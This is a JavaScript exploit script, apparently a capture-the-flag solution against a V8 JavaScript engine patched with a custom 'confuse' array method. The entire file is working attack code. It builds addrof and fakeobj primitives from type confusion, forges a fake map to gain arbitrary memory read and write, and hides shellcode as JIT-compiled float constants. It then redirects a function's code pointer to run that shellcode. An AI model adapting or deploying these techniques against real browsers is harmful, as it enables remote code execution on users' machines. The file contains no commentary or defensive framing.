var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof64(val_low, val_high) { 
    var lower = Number(val_low);
    var upper = Number(val_high);
    u64_buf[0] = lower;
    u64_buf[1] = upper;
    return f64_buf[0];
}

function toHex(value) {
    return "0x" + value.toString(16);
}

const shell = () => { 
    return [ 1.957153445933527e-246, 1.9711832695973434e-246, 1.9711828972663056e-246, 1.9711827004344125e-246, 1.9711827302878254e-246, 1.971182751616449e-246, 1.9711824831022323e-246, 1.9711827729617224e-246, 1.9711827260920306e-246, 1.971182282819631e-246, 1.9710306750501128e-246, ];
};

for (let i=0; i<999999; i++) { 
    shell();
};

// ----------------- addrof/fakeobj -----------

let a = ["A", "B"];

function addrof(in_obj){
	a[0] = in_obj
	a.confuse();
	let ret = ftoi(a[0]) & 0xffffffffn;
	a[0] = "A";
	a.confuse();
	return ret;
}

function fakeobj(addr){
	let f_arr = [1.1, 1.2, 1.3, 1.4, 1.5];
	f_arr[0] = itof(addr);
	f_arr.confuse();
	let fake = f_arr[0];
	return fake;
}

// ---------- arbRead/arbWrite ----------------

let fake_dbl_arr = [1.1,1.2,1.8];
let fake_map = [itof(0x31040404001c0201n),itof(0x0a0007ff11000844n),itof(0x001cb82d001cb1c5n),itof(0x00000735001cb7f9n)];
let fake_map_struct = [itof64(addrof(fake_map)+0x8cn, 0), itof64(addrof(fake_dbl_arr)+0x18n, 0x10)];
let fake = fakeobj(addrof(fake_map_struct)+0xd0n);

function arbRead(addr){ 
    fake_map_struct[1] = itof64(addr-8n,0x10);
    return ftoi(fake[0]);
};

function arbWrite(addr,val){ 
    fake_map_struct[1] = itof64(addr-8n,0x10);
    fake[0] = itof(val);
};

// ------------------- get shell ----------

let shell_func_addr = addrof(shell);
let code_ptr = arbRead(shell_func_addr+12n) & 0xffffffffn;
console.log("Shell function address: " + toHex(shell_func_addr));
console.log("Code pointer address: " + toHex(code_ptr));

let rwx_addr = arbRead(code_ptr + 0x14n);
let shellcodeaddr = (rwx_addr +0x5cn);
console.log("Rwx address: " + toHex(rwx_addr));
console.log("Shellcode address: " + toHex(shellcodeaddr));

arbWrite(code_ptr+0x14n, shellcodeaddr);
shell();


